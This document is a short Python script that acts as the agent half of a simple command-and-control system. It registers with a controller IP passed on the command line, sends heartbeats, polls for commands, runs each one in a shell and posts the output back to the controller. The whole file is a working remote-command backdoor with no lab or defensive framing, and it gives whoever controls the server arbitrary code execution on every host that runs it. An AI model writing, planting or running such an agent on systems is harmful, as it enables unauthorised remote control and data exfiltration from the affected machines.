import requests
import threading
import time
import subprocess
import socket
import sys

if len(sys.argv) != 2:
    print("Usage: python file.py <controller-ip>")
    sys.exit(1)

ip = sys.argv[1]
CONTROLLER_URL = f'http://{ip}:8000'  # Dynamic controller IP from arguments
AGENT_ID = 'agent-' + socket.gethostname()

def heartbeat():
    while True:
        try:
            requests.post(f"{CONTROLLER_URL}/heartbeat", json={"agent_id": AGENT_ID})
        except Exception as e:
            print(f"Heartbeat failed: {e}")
        time.sleep(10)

def poll_commands():
    last_cmd = None
    while True:
        try:
            r = requests.get(f"{CONTROLLER_URL}/get_command/{AGENT_ID}")
            if r.status_code == 200:
                cmd_data = r.json()
                cmd = cmd_data.get('cmd')
                if cmd and cmd != last_cmd:
                    last_cmd = cmd
                    output = execute_command(cmd)
                    requests.post(f"{CONTROLLER_URL}/post_result/{AGENT_ID}", json={"output": output})
        except Exception as e:
            print(f"Polling failed: {e}")
        time.sleep(5)

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

if __name__ == '__main__':
    threading.Thread(target=heartbeat, daemon=True).start()
    threading.Thread(target=poll_commands, daemon=True).start()
    while True:
        time.sleep(1)
